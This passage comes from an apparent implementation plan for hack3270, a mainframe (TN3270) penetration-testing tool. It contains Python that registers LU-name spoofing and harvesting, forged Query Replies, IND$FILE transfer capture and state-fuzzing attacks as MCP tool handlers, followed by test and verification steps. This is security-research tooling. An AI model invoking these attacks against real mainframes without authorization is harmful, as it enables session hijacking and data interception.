            return "ERROR: active probing disabled (set esm.active_enabled=True)"
        # The actual probe needs daemon — left for integration
        muts = esm._generate_mutations(parts[0], parts[1])
        return json.dumps([m["name"] for m in muts])

    api_server.register("esm_get_findings", esm_get_findings)
    api_server.register("esm_active_probe", esm_active_probe)

    # --- LU-name spoofer ---

    def lu_spoof_single(args: str) -> str:
        name = args.strip()
        if not name:
            return "ERROR: usage: lu_spoof_single <luname>"
        lu.set_target(name)
        return "OK"

    def lu_spoof_next(_args: str) -> str:
        nxt = lu.next_lu()
        return nxt if nxt else "DONE"

    def lu_get_harvested(_args: str) -> str:
        return json.dumps(sorted(lu.harvested))

    def lu_get_results(_args: str) -> str:
        return json.dumps([list(r) for r in lu.results])

    api_server.register("lu_spoof_single", lu_spoof_single)
    api_server.register("lu_spoof_next", lu_spoof_next)
    api_server.register("lu_get_harvested", lu_get_harvested)
    api_server.register("lu_get_results", lu_get_results)

    # --- Query Reply liar ---

    def qr_arm(args: str) -> str:
        try:
            d = json.loads(args) if args.strip() else {}
        except json.JSONDecodeError as e:
            return f"ERROR: bad JSON: {e}"
        # QueryLies fields: alt_rows, alt_cols, deny_color,
        # deny_highlighting, deny_graphics, rpq_name
        lies = QueryLies(
            alt_rows=d.get("alt_rows"),
            alt_cols=d.get("alt_cols"),
            deny_color=d.get("deny_color", False),
            deny_highlighting=d.get("deny_highlighting", False),
            deny_graphics=d.get("deny_graphics", False),
            rpq_name=d.get("rpq_name"),
        )
        qr.arm(lies)
        return "OK"

    def qr_disarm(_args: str) -> str:
        qr.disarm()
        return "OK"

    api_server.register("qr_arm", qr_arm)
    api_server.register("qr_disarm", qr_disarm)

    # --- IND$FILE detector ---

    def indfile_set_mode(args: str) -> str:
        mode = args.strip()
        if mode not in _VALID_INDFILE_MODES:
            return f"ERROR: mode must be one of {sorted(_VALID_INDFILE_MODES)}"
        indfile.mode = mode
        return "OK"

    def indfile_get_captures(_args: str) -> str:
        return json.dumps(indfile.captures)

    api_server.register("indfile_set_mode", indfile_set_mode)
    api_server.register("indfile_get_captures", indfile_get_captures)

    # --- State fuzzer ---

    def flow_record_start(args: str) -> str:
        name = args.strip() or "unnamed"
        fuzzer.start_recording(name)
        return "OK"

    def flow_record_stop(_args: str) -> str:
        flow_id = fuzzer.stop_recording()
        return str(flow_id)

    def flow_analyze(args: str) -> str:
        try:
            flow_id = int(args.strip())
        except ValueError:
            return "ERROR: usage: flow_analyze <flow_id>"
        targets = fuzzer.analyze(flow_id)
        return json.dumps([asdict(t) for t in targets])

    def flow_list_mutations(_args: str) -> str:
        return json.dumps(_MUTATIONS)

    api_server.register("flow_record_start", flow_record_start)
    api_server.register("flow_record_stop", flow_record_stop)
    api_server.register("flow_analyze", flow_analyze)
    api_server.register("flow_list_mutations", flow_list_mutations)
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_mcp_tools.py -v
```

Expected: `18 passed`

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/mcp_tools.py tests/test_mcp_tools.py
git commit -m "feat(mcp): register all Phase 3 attacks as ApiServer handlers"
```

---

## Task 11: Full test suite + integration check

**Files:** none modified — verification only.

- [ ] **Step 1: Run full Phase 3 suite**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/ -v
```

Expected: `~153 passed` (45 + 18 + 20 + 38 + 33 + 18 — exact count depends on whether any tests were combined). Zero failures.

- [ ] **Step 2: Run Phase 0 suite to verify nothing broke**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest hackterm-core/tests/ -v
```

Expected: all Phase 0 tests still pass (~73). Phase 3 only ADDS code; it doesn't touch `hackterm_core/`.

- [ ] **Step 3: Verify all attacks importable from one place**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python -c "
from hack3270_libs.tn3270_v2 import TN3270
from hack3270_libs.attacks.esm_passive import ESMFingerprinter
from hack3270_libs.attacks.negotiation import LUSpoofer
from hack3270_libs.attacks.structured import QueryReplyLiar, IndFileInterceptor
from hack3270_libs.attacks.state_fuzz import StateFuzzer
from hack3270_libs.mcp_tools import register_all
from hackterm_core import Protocol
assert issubclass(TN3270, Protocol)
print('all Phase 3 imports OK')
"
```

Expected: `all Phase 3 imports OK`

- [ ] **Step 4: Tag the phase**

```bash
git tag phase3-complete
```

---

## Self-Review

**Spec coverage check** (against §3 and §5 Phase 3 table):

| Spec item | Plan task | ✓ |
|---|---|---|
| §3.1 tn3270_v2 — WCC tracking | Task 1b (`_HAS_WCC` set, `i = 2` skip) | ✓ |
| §3.1 IAC 0xFF 0xFF un-escaping | Task 1b (`_unescape_iac()`, `test_parse_iac_unescape`) | ✓ |
| §3.1 SBA position tracking | Task 1b (`_ParseState.addr`, `test_parse_sba_positioning`) | ✓ |
| §3.1 TN3270E header parsing | Task 1b (`_strip_tn3270e_header()`, `test_parse_tn3270e_header_*`) | ✓ |
| §3.1 No false-positive on 0x1D | Task 1b (`test_parse_no_false_positive_on_0x1d_in_text`) | ✓ |
| §3.1 `parse()` → Screen | Task 1b | ✓ |
| §3.1 `mutate()` context-aware | Task 1c (`test_mutate_does_not_flip_data_bytes`) | ✓ |
| §3.1 `build_inbound()` 12/14-bit | Task 1d | ✓ |
| §3.1 Golden-file tested | Task 0 + 1b (8 `.bin` files, all asserted) | ✓ |
| §3.2 LUSpoofer single/wordlist/harvest | Task 3 | ✓ |
| §3.2 splice CONNECT clause | Task 1b (`_splice_lu_name`) + Task 3 tests | ✓ |
| §3.2 wordlist reconnect cycle | Task 3 (`next_lu()` — driver loop is GUI/MCP) | ✓ |
| §3.2 screen fingerprint compare | Task 3 (`screen_matches_fingerprint`) | ✓ |
| §3.2 lu-names.txt | Task 9 | ✓ |
| §3.3 ESM regex rules (8 patterns) | Task 2 (`_RULES`, 8 entries) | ✓ |
| §3.3 password field length inference | Task 2 (`_check_fields`, `test_8char_password_field_*`) | ✓ |
| §3.3 active probe mutations | Task 2 (`_generate_mutations`) | ✓ |
| §3.4 QR — eat Read Partition Query | Task 4 (`is_read_partition_query`, `_intercept_s2c`) | ✓ |
| §3.4 QR — synthesize SF reply | Task 4 (`build_query_reply`, 6 `_sf_*` builders) | ✓ |
| §3.4 QR — alt_rows/cols/deny_color/rpq | Task 4 (all in `QueryLies` mapped) | ✓ |
| §3.4 IND$FILE state machine | Task 5 (IDLE→ARMED→TRANSFERRING) | ✓ |
| §3.4 IND$FILE carbon_copy mode | Task 5 (`test_indfile_carbon_copy_writes_file`) | ✓ |
| §3.4 IND$FILE inject mode | Task 5 (`_intercept_c2s`, best-effort per spec §8) | ✓ |
| §3.5 Step/Flow/EchoTarget dataclasses | Task 6 | ✓ |
| §3.5 Phase 1 — record observer | Task 6 | ✓ |
| §3.5 Phase 1 — SQLite Flows+Steps | Task 6 (`_init_schema`, `stop_recording`) | ✓ |
| §3.5 Phase 2 — analyze O(n²×f) | Task 7 | ✓ |
| §3.5 Phase 2 — confidence scoring | Task 7 (`test_analyze_confidence_*`) | ✓ |
| §3.5 Phase 3 — 5 mutations | Task 8 (`mutate_input`, all 5 tested) | ✓ |
| §3.5 Phase 3 — 4 result classes | Task 8 (`classify_result`) | ✓ |
| §3.5 Phase 3 — fuzzy screen compare | Task 8 (`screens_match_fuzzy`) | ✓ |
| MCP tools (all 14) | Task 10 | ✓ |
| §6 synthetic packets, not mocks | Task 0 (golden generator with inline byte-doc) | ✓ |

**Build-order check** (matches user-required order):

1. ✓ Task 1 — tn3270_v2 (foundation, 4 sub-tasks)
2. ✓ Task 2 — ESM passive (cheapest, validates observer pattern)
3. ✓ Task 3 — LU spoof (telnet-layer, near-independent of parser)
4. ✓ Task 4 — Query Reply SF builder
5. ✓ Task 5 — IND$FILE (shares `parse_wsf` with #4)
6. ✓ Task 6 — Flow recording
7. ✓ Task 7 — Echo-back analysis
8. ✓ Task 8 — Mutate-replay
9. ✓ Task 9 — lu-names.txt
10. ✓ Task 10 — MCP registration

**Type/name consistency check:**

| Symbol | Defined | Consumed |
|---|---|---|
| `TN3270` | Task 1 | Tasks 2, 3, 5, 6, 10 |
| `TN3270.is_tn3270e` | Task 1b | Task 1d, Task 4 (`build_query_reply`) |
| `_splice_lu_name` | Task 1b | Task 3 tests |
| `Field.content` (bytes EBCDIC) | Phase 0 | Task 7 (`stripped in user_input`) |
| `Screen.text` | Phase 0 | Tasks 2, 5, 7, 8 |
| `Screen.raw` | Phase 0 | Task 6 (`step.host_screen.raw` → SQLite) |
| `FakeDaemon.fire_s2c/fire_c2s` | Task 0 conftest | All attack tests |
| `parse_wsf` → `StructuredField` | Task 5 | Task 5, `TN3270.parse_structured` |
| `EchoTarget.source_step` | Task 6 | Task 8 (`fuzz_target`) |

**Known limitations** (acceptable per spec §7/§8):

- `fuzz_target()` `_wait_for_response()` polls — adequate for fuzzing, not production
- IND$FILE inject mode is best-effort, may corrupt transfers (spec §8 explicitly out of scope)
- `screens_match_fuzzy()` ignores ALL field content — may miss legitimate divergence; spec §7 lists "fuzzer too noisy" as a known risk with this exact mitigation
- ProxyDaemon has no `remove_observer()` — `_wait_for_response` reaches into `daemon._observers` (works with both real and FakeDaemon)
- GUI tabs deferred — MCP-first per spec §5 Phase 3 note
```

---
